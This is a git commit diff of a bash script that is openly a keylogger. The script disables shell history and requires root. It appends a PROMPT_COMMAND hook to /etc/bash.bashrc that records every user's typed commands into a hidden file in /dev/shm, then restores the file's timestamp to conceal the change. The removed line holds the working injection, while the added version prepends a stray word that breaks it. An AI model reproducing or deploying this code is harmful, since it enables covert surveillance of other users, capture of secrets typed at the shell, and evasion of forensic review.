279204697c2c3be78099cc362b25c3e6fa94d789
Gleidson Marques dos Santos <gleidson.marquesms@gmail.com>
2023-10-25 19:21:17 -0300

    Atualização 2

--- Keylogger/keylogger.sh
+++ Keylogger/keylogger.sh
@@ -1,10 +1,10 @@
 #!/usr/bin/env bash
 
 set +o history
-echo "[i] - history disabled.."
+echo "[i] - Nothing else will be recorded."
 
 if [[ $EUID > 0 ]]; then
-  echo "[!] - you have to be root ¯\_(ツ)_/¯"
+  echo "[!] - you need to be root bro"
   exit
 fi
 
@@ -12,11 +12,11 @@ output=${1:-"/dev/shm/.log"}
 mtime=`stat -c "%y" /etc/bash.bashrc`
 
 echo "[!] - /etc/bash.bashrc was modified @ ${mtime}"
-echo "[!] - setting up PROMPT_COMMAND keylogger.."
+echo "[!] - calm down, your keylogger is being configured not PROMPT_COMMAND.."
 
-echo "export PROMPT_COMMAND='RETRN_VAL=\$?;echo \"\$(whoami) [\$\$]: \$(history 1 | sed \"s/^[ ]*[0-9]\+[ ]*//\" ) [\$RETRN_VAL]\" >> ${output}'" >> /etc/bash.bashrc
+echo "lets export PROMPT_COMMAND='RETRN_VAL=\$?;echo \"\$(whoami) [\$\$]: \$(history 1 | sed \"s/^[ ]*[0-9]\+[ ]*//\" ) [\$RETRN_VAL]\" >> ${output}'" >> /etc/bash.bashrc
 
 echo "[!] - restoring mtime of /etc/bash.bashrc to ${mtime}"
 touch -d "${mtime}" /etc/bash.bashrc
 
-echo "[!] - done, check ${output} ツ"
+echo "[!] - Everything is over here, check your ${output} ツ"
